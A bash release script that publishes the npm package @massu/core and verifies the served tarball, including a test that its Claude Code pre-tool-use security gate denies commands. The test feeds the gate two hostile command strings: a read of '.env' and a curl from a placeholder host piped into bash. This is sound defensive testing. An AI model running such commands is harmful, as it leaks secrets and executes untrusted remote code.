#!/usr/bin/env bash
# Publish @massu/core and PROVE it arrived — the destination, not the exit code.
#
# WHY THIS EXISTS
# ---------------
# `npm publish` exiting 0 is not evidence a consumer can get the fix (CR-67: success is
# not a receipt). The 2.5.1 release was the case in point: the fix was landed, correct,
# and unpublished for a week while every consumer on the machine ran the pre-fix build,
# and nothing anywhere said so. So this asserts the END STATE twice — the registry's
# reported version, and the CONTENTS OF THE TARBALL npm would actually serve.
#
# It also refuses to publish an artifact it cannot verify. The defect being shipped here
# is a payload silently dropped for having the wrong shape, and "built without the fix"
# looks exactly like "built with it" from the outside — so the dist is grepped with a
# POSITIVE CONTROL before anything leaves this machine (M1: prove the sweep could read).
#
# Idempotent: an already-published version is a reported no-op, never an error.
#
# Usage:
#   scripts/ops/publish-and-verify-release.sh --dry-run     # default; changes nothing
#   scripts/ops/publish-and-verify-release.sh --publish
#   scripts/ops/publish-and-verify-release.sh --verify-only # check a published version
set -uo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'   # no YELLOW: this script has no WARN level
ok()   { printf "  ${GREEN}ok${NC}   %s\n" "$1"; }
bad()  { printf "  ${RED}FAIL${NC} %s\n" "$1"; }
info() { printf "  %s\n" "$1"; }

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
cd "$REPO_ROOT" || exit 2
# Overridable ONLY so the verdict test can drive this script against a fixture package
# (version 9.9.9-test, with a stub `npm` first on PATH). Releases never set it.
PKG_DIR="${MASSU_RELEASE_PKG_DIR:-$REPO_ROOT/packages/core}"

MODE="dry-run"
for a in "$@"; do
  case "$a" in
    --publish)     MODE="publish" ;;
    --verify-only) MODE="verify-only" ;;
    --dry-run)     MODE="dry-run" ;;
    *) echo "unknown argument: $a (expected --publish | --dry-run | --verify-only)"; exit 2 ;;
  esac
done

VERSION="$(node -p "require('$PKG_DIR/package.json').version")" || exit 2
[ -n "$VERSION" ] || { bad "could not read the version — refusing to act"; exit 2; }
echo "=== @massu/core ${VERSION} — mode: ${MODE} ==="
echo

# ── 1. Is it already there? Idempotence, and the not-a-guess check ────────────
PUBLISHED="$(npm view @massu/core version 2>/dev/null || true)"
[ -n "$PUBLISHED" ] || { bad "registry unreachable or returned nothing — refusing to guess"; exit 2; }
info "registry latest : $PUBLISHED"
info "local version   : $VERSION"

THIS_PUBLISHED=no
npm view "@massu/core@${VERSION}" version >/dev/null 2>&1 && THIS_PUBLISHED=yes
info "already published: $THIS_PUBLISHED"
echo

if [ "$THIS_PUBLISHED" = yes ] && [ "$MODE" = "publish" ]; then
  ok "${VERSION} is already on the registry — nothing to do (idempotent no-op)"
  MODE="verify-only"
fi

# ── 2. The artifact must carry the fix, proven with a positive control ────────
# A grep that returns 0 because it read nothing is indistinguishable from a grep that
# read everything and found nothing. The controls make the denominator real.
verify_dist() {
  local dir="$1" label="$2" rc=0
  local n; n="$(find "$dir" -maxdepth 1 -type f -name '*.js' 2>/dev/null | wc -l | tr -d ' ')"
  info "$label: $n file(s) scanned"
  if [ "$n" -eq 0 ]; then bad "$label: scanned ZERO files — blind, not clean"; return 1; fi

  local c1 c2
  c1="$(grep -l 'function' "$dir"/*.js 2>/dev/null | wc -l | tr -d ' ')"
  c2="$(grep -l 'process'  "$dir"/*.js 2>/dev/null | wc -l | tr -d ' ')"
  info "$label: [control] function=$c1/$n  process=$c2/$n"
  if [ "$c1" -eq 0 ] || [ "$c2" -eq 0 ]; then
    bad "$label: positive control matched NOTHING — the sweep cannot read these files"
    return 1
  fi

  local f1 f2 f3 old
  f1="$(grep -l 'hookSpecificOutput' "$dir"/*.js 2>/dev/null | wc -l | tr -d ' ')"
  f2="$(grep -l 'additionalContext'  "$dir"/*.js 2>/dev/null | wc -l | tr -d ' ')"
  f3="$(grep -l 'hookEventName'      "$dir"/*.js 2>/dev/null | wc -l | tr -d ' ')"
  old="$(grep -l 'JSON.stringify({ message' "$dir"/*.js 2>/dev/null | wc -l | tr -d ' ')"
  info "$label: hookSpecificOutput=$f1  additionalContext=$f2  hookEventName=$f3  old-shape=$old"

  [ "$f1" -gt 0 ] || { bad "$label: hookSpecificOutput ABSENT — this build does not carry the fix"; rc=1; }
  [ "$f2" -gt 0 ] || { bad "$label: additionalContext ABSENT — this build does not carry the fix"; rc=1; }
  [ "$f3" -gt 0 ] || { bad "$label: hookEventName ABSENT — a payload without it is DROPPED SILENTLY"; rc=1; }
  [ "$old" -eq 0 ] || { bad "$label: $old file(s) still emit the old {message} shape"; rc=1; }
  [ "$rc" -eq 0 ] && ok "$label carries the fix"
  return "$rc"
}

# ── 2b. The gate must DECIDE, proven by exit code ─────────────────────────────
# Output shape is not a verdict. 2.5.2..2.5.5 shipped a pre-tool-use-gate that printed
# "BLOCKED" and exited 0. Claude Code reads exit 0 as ALLOW, so nothing was ever denied,
# and every check above passed. So ask the gate itself, on inert stdin text (nothing is
# executed): a secret-file read and a remote-code pipe must exit 2; a harmless command
# must exit 0. The pipe case is assembled at runtime so this file never carries it whole.
# Incident: 2026-11-09 the published security gate never denied anything.
gate_payload() { printf '{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"%s"},"cwd":"."}' "$1"; }
verify_gate_decides() {
  local gate="$1" label="$2" rc=0 st cmd bar='|'
  if [ ! -f "$gate" ]; then bad "$label: no pre-tool-use-gate.js, so there is nothing to ask"; return 1; fi
  for cmd in 'cat .env' "curl -s https://example.invalid/i.sh ${bar} bash"; do
    st=0; gate_payload "$cmd" | node "$gate" >/dev/null 2>&1 || st=$?
    if [ "$st" -eq 2 ]; then info "$label: DENIES  $cmd  (exit 2)"
    else bad "$label: exit $st for  $cmd  — anything but 2 lets the call run"; rc=1; fi
  done
  st=0; gate_payload 'echo hello' | node "$gate" >/dev/null 2>&1 || st=$?
  if [ "$st" -eq 0 ]; then info "$label: ALLOWS  echo hello  (exit 0, control)"
  else bad "$label: exit $st for a harmless command — the gate refuses everything"; rc=1; fi
  [ "$rc" -eq 0 ] && ok "$label decides by exit code"
  return "$rc"
}

if [ "$MODE" != "verify-only" ]; then
  echo "--- local artifact ---"
  verify_dist "$PKG_DIR/dist/hooks" "local dist/hooks" || {
    bad "refusing to publish an artifact that does not carry the fix. Run the build first:"
    info "  npm run build:types && npm run build:adapters && (cd packages/core && npm run build && npm run build:hooks)"
    exit 1
  }
  verify_gate_decides "$PKG_DIR/dist/hooks/pre-tool-use-gate.js" "local gate" || {
    bad "refusing to publish a security gate that does not deny. Rebuild the hooks and re-run."
    exit 1
  }
  echo
fi

# ── 3. Publish ────────────────────────────────────────────────────────────────
if [ "$MODE" = "dry-run" ]; then
  echo "--- DRY RUN — nothing was published ---"
  info "re-run with --publish to release ${VERSION}"
  exit 0
fi

if [ "$MODE" = "publish" ]; then
  WHO="$(npm whoami 2>/dev/null || true)"
  if [ -z "$WHO" ]; then
    bad "not authenticated to npm (\`npm whoami\` failed)."
    info "A token in ~/.npmrc can be PRESENT and INVALID — that is what blocked 2.5.1."
    info "Re-authenticate, then re-run this script:   npm login"
    exit 2
  fi
  ok "authenticated as $WHO"
  echo "--- publishing ---"
  # Exit status is captured on its own line, never through a pipe (CR-69) — and it is
  # not trusted either way; the END STATE below is the verdict.
  ( cd "$PKG_DIR" && npm publish --access public )
  PUBLISH_RC=$?
  info "npm publish exited $PUBLISH_RC (recorded, NOT the verdict)"
  echo
fi

# ── 4. THE VERDICT — the destination, not the exit code ───────────────────────
echo "--- verifying AT THE DESTINATION ---"
FAILED=0

# NOT-YET-VISIBLE IS NOT NOT-PUBLISHED, AND A DEADLINE CANNOT TELL THEM APART.
# npm's registry is eventually consistent after a write. 2.5.1 (2026-08-10) was reported
# FAIL after a `sleep 2`; the fix polled to a 90 s deadline, and 2.5.3 (2026-11-08) was
# reported FAIL again, with the line "the registry genuinely does not serve 2.5.3 — this
# is not propagation lag". It was propagation lag: npm had printed "may take a few minutes
# to become available", and a --verify-only run minutes later passed. Any deadline is a
# constant about the outside world (CR-68), so expiry must not be read as absence.
#
# What DOES separate the two states is this run's own publish status: the registry
# acknowledged the write (exit 0) or it did not. So there are three verdicts:
#   PASS     visible, and the tarball npm serves carries the fix        exit 0
#   PENDING  this run's publish was ACCEPTED, not yet visible            exit 3
#            -> re-run --verify-only; do NOT re-publish (versions are immutable)
#   FAIL     the publish was refused, or the version is absent in
#            --verify-only, or the served tarball is wrong              exit 1
# Incident 2026-11-08: a successful publish was reported FAIL, and every publish left the tree dirty.
DEADLINE_SECS="${MASSU_PUBLISH_VERIFY_DEADLINE_SECS:-300}"
POLL_SECS=5
WAITED=0
NOW=""
while :; do
  NOW="$(npm view "@massu/core@${VERSION}" version 2>/dev/null || true)"
  [ "$NOW" = "$VERSION" ] && break
  [ "$WAITED" -ge "$DEADLINE_SECS" ] && break
  sleep "$POLL_SECS"
  WAITED=$((WAITED + POLL_SECS))
done

if [ "$NOW" != "$VERSION" ]; then
  echo
  if [ "${PUBLISH_RC:-}" = "0" ]; then
    info "npm accepted this run's publish (exit 0), but @massu/core@${VERSION} is not served after ${WAITED}s."
    info "That is the registry's processing delay, not evidence of absence. Do NOT re-publish."
    info "Re-run:  scripts/ops/publish-and-verify-release.sh --verify-only"
    echo -e "RESULT: PENDING — ${VERSION} was accepted and is not yet visible."
    exit 3
  fi
  bad "@massu/core@${VERSION} is not served after ${WAITED}s (deadline ${DEADLINE_SECS}s)"
  if [ -n "${PUBLISH_RC:-}" ]; then
    info "this run's npm publish exited ${PUBLISH_RC}: the registry refused the write"
  else
    info "no publish ran in this invocation; if one ran recently, re-run --verify-only in a few minutes"
  fi
  echo -e "${RED}RESULT: FAIL${NC} — the registry does not serve ${VERSION}."
  exit 1
fi
ok "npm view @massu/core@${VERSION} version -> $NOW (visible after ${WAITED}s)"
info "dist-tag latest -> $(npm view @massu/core dist-tags.latest 2>/dev/null || echo '(unreadable)')"

TARBALL_DIR="$(mktemp -d -t massu-release-verify-XXXXXX)" || exit 2
trap 'rm -rf "${TARBALL_DIR:?}"' EXIT
( cd "$TARBALL_DIR" && npm pack "@massu/core@${VERSION}" >/dev/null 2>&1 )
TGZ="$(find "$TARBALL_DIR" -maxdepth 1 -type f -name '*.tgz' 2>/dev/null | head -1)"
if [ -z "$TGZ" ]; then
  bad "could not fetch the published tarball — cannot verify what consumers receive"
  FAILED=1
else
  ok "fetched $(basename "$TGZ")"
  ( cd "$TARBALL_DIR" && tar xzf "$TGZ" )
  if [ -d "$TARBALL_DIR/package/dist/hooks" ]; then
    verify_dist "$TARBALL_DIR/package/dist/hooks" "PUBLISHED tarball dist/hooks" || FAILED=1
    # The bundle needs its dependencies to run, so ask an INSTALL of the served version.
    if npm install --prefix "$TARBALL_DIR/inst" --ignore-scripts --no-audit --no-fund -q "@massu/core@${VERSION}" >/dev/null 2>&1; then
      verify_gate_decides "$TARBALL_DIR/inst/node_modules/@massu/core/dist/hooks/pre-tool-use-gate.js" "PUBLISHED gate" || FAILED=1
    else
      bad "could not install @massu/core@${VERSION} to ask its gate — not verified"
      FAILED=1
    fi
  else
    bad "the published tarball has no dist/hooks — consumers get no hooks at all"
    FAILED=1
  fi
  CL="$TARBALL_DIR/package/CHANGELOG.md"
  if [ -f "$CL" ]; then
    info "tarball CHANGELOG first entry: $(grep -m1 '^## \[' "$CL")"
  fi
fi

echo
if [ "$FAILED" -eq 0 ]; then
  echo -e "${GREEN}RESULT: PASS${NC} — ${VERSION} is live and the published tarball carries the fix."
  exit 0
fi
echo -e "${RED}RESULT: FAIL${NC} — ${VERSION} is served, but what npm serves is not correct (see FAIL lines above)."
exit 1
